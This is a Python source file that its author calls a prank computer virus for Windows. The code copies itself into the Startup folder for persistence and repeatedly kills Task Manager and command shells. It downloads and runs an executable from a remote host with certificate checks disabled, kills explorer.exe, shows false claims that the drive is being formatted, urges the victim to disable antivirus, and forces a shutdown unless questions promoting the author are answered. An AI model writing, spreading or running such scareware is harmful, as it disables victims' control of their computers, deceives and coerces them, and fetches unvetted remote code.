#作者：赵博凯
#语言：Python
from requests import get
import tkinter as tk
from tkinter import messagebox
from os import remove, system
from time import sleep
from random import choice, randint
from threading import Thread
import pygame as pg
import pyttsx3 as ptt
from sys import argv


# 关闭任务管理器、命令提示符和Windows终端
def close():
    while True:
        system('taskkill /f /im taskmgr.exe')
        system('taskkill /f /im cmd.exe')
        system('taskkill /f /im WindowsTerminal.exe')
        if exit_:
            break
    return


# 播放音乐
def music():
    while True:
        music_file.play()
        if exit_:
            break
    return


# 获取文件
def get_(url, file):
    respones = get(url, verify=False)
    if respones.status_code == 200:
        with open(file, 'wb') as f:
            f.write(respones.content)
    else:
        print('获取失败')
        exit()


# 蓝屏模拟器
def bluescreensimulator():
    get_('https://zhaobokai341.github.io/zhaobokai341_file.github.io/bluescreensimulator.txt',
         'bluescreensimulator.exe')


# 语音合成
def speak(content):
    global say
    for i in range(2):
        say = ptt.init()
        say.say(content)
        say.runAndWait()
    return


# 下载文件
def download():
    globals()['t'] = Thread(target=close)
    t.start()
    globals()['t3'] = Thread(target=bluescreensimulator)
    t3.start()
    get_('https://zhaobokai341.github.io/zhaobokai341_file.github.io/red%20zone.txt', 'red_zone.mp3')
    globals()['music_file'] = pg.mixer.Sound('red_zone.mp3')
    music_file.set_volume(0.05)
    globals()['t2'] = Thread(target=music)
    t2.start()


# 弹窗
def Pop_ups(text, range_):
    Thread(target=speak, args=(text,)).start()
    root = []
    color = ['red', 'green', 'blue', 'yellow', 'purple', 'pink', 'orange', 'cyan', 'white', 'black']
    for i in range(range_):
        root.append(tk.Tk())
        root[i].title('赵博凯恶搞电脑病毒')
        root[i].geometry(f'{len(text) * 20}x50+{randint(0, 1600)}+{randint(0, 800)}')
        tk.Label(root[i], text=text, font=('Arial', 12), height=2, bg=choice(color)).pack()
        root[i].update()
    sleep(3)
    for i in root:
        try:
            i.destroy()
            i.quit()
        except:
            pass
    for i in root:
        i.mainloop()
    sleep(3)
    return


# 弹窗1
def Pop_ups1():
    def Pop_ups1_():
        messagebox.showinfo('错误', '请放心使用你的电脑，我在对你的系统报废中...')
        messagebox.showwarning('警告', '请关闭杀毒软件，还有请不要关闭电脑，否则接下来对你损失更大！')

    tPop_ups = Thread(target=Pop_ups1_)
    tPop_ups.start()
    tPop_ups.join(1)
    sleep(13)
    if not str(argv[0]).startswith(r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'):
        system(fr'copy "{argv[0]}" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"')
    root = tk.Tk()
    var = tk.StringVar()
    tk.Label(root, textvariable=var, font=('Arial', 12), width=20, height=2).pack()
    for i in range(3, 0, -1):
        var.set(f'电脑报废倒计时...{i}秒')
        root.update()
        sleep(1)
    try:
        root.destroy()
        root.quit()
    except:
        pass
    root.mainloop()

    def Pop_ups2():
        for j in range(10):
            messagebox.showerror('错误', '你的电脑被我恶搞了！')
            sleep(1)

    tPop_ups = Thread(target=Pop_ups2)
    tPop_ups.start()
    tPop_ups.join(1)
    sleep(3)
    Thread(target=Pop_ups2).start()
    Pop_ups('B站@编程博凯', 50)
    Pop_ups('我成功入侵你的电脑', 100)
    Pop_ups('我正在给你的电脑下格式化命令rd /s /q C:', 100)
    system('taskkill /im explorer.exe /f')
    Pop_ups('好了，现在已经报废了', 50)


# 蓝屏模拟器
def run_bluescreensimulator():
    while True:
        try:
            open('bluescreensimulator.exe').close()
            break
        except:
            pass
    Thread(target=speak, args=('你的电脑蓝屏了，哈哈哈',)).start()
    system('bluescreensimulator.exe --win10 --cafd 0 --pf 0.1 --sc "stop code:赵博凯恶搞电脑病毒.py"')
    for i in ['#0000000', '#0ff0000', '#0008000', '#00000ff']:
        system(
            f'bluescreensimulator.exe --win10 -e :) --sp 60 -b {i} --cafd 0 --pf 0.1 --sc "stop code:赵博凯恶搞电脑病毒.py"')
        sleep(1)
    system('bluescreensimulator.exe --win7')
    sleep(1)
    system('bluescreensimulator.exe --win9x')
    sleep(1)
    system(
        'bluescreensimulator.exe --win10 -e :) --m1 你的电脑蓝屏了，但请不要关闭电脑 --m2 哈哈哈（https://zhaobokai341.github.io） -p '
        '格式化中... -mi "B站 @编程博凯" -s 请联系赵博凯 --sc 错误代码：KEEP_IN_MIND_THE_TEXT_ABOVE')


# 问题
def question():
    global question_
    question_list = ['赵博凯的B站名称是什么', ['编程博凯', '@编程博凯', 'B站编程博凯', 'B站@编程博凯', 'B站 @编程博凯'],
                     '赵博凯个人网址是什么', ['https://zhaobokai341.github.io', 'zhaobokai341.github.io'],
                     '是否给赵博凯一键三连加关注，a.是，b.否', ['a', '是']]
    root = tk.Tk()
    root.title('赵博凯恶搞电脑病毒')
    var = tk.StringVar()
    tk.Label(root, textvariable=var, bg="yellow").pack()
    var.set('请在3分钟内回答3个问题，否则电脑会自动关机')
    root.update()
    sleep(3)
    system('shutdown -s -t 180')
    e = tk.Entry(root, bg="green")
    e.pack()
    var.set(question_list[question_ * 2])

    def next_question():
        global question_
        question_ += 1
        if question_ == 3:
            system('shutdown -a')
            try:
                remove(fr"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\{str(argv[0]).split('\\')[-1]}")
            except Exception as e:
                messagebox.showerror('错误',
                                     fr'请手动删除启动项：位于“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
{str(argv[0]).split('\\')[-1]}”错误原因：{e}')
            root.destroy()
            root.quit()
            return
        var.set(question_list[question_ * 2])

    def Enter():
        if e.get() in question_list[question_ * 2 + 1]:
            messagebox.showinfo('正确', '答对了')
            next_question()
        else:
            messagebox.showerror('错误', '答错了')

    tk.Button(root, text='提交', bg="blue", command=Enter).pack()
    root.mainloop()
    return


# 删除文件
def delete():
    while True:
        try:
            remove('bluescreensimulator.exe')
            remove('red_zone.mp3')
            system("explorer.exe")
            break
        except PermissionError:
            pass


if __name__ == '__main__':
    pg.init()
    say = ptt.init()
    exit_ = False
    if not str(argv[0]).startswith(r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'):
        for i in range(2):
            try:
                system(fr'copy "{argv[0]}" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"')
            except:
                pass
    download()
    Pop_ups1()
    run_bluescreensimulator()
    question_ = 0
    delete()
    exit_ = True
    question()
    raise SystemExit
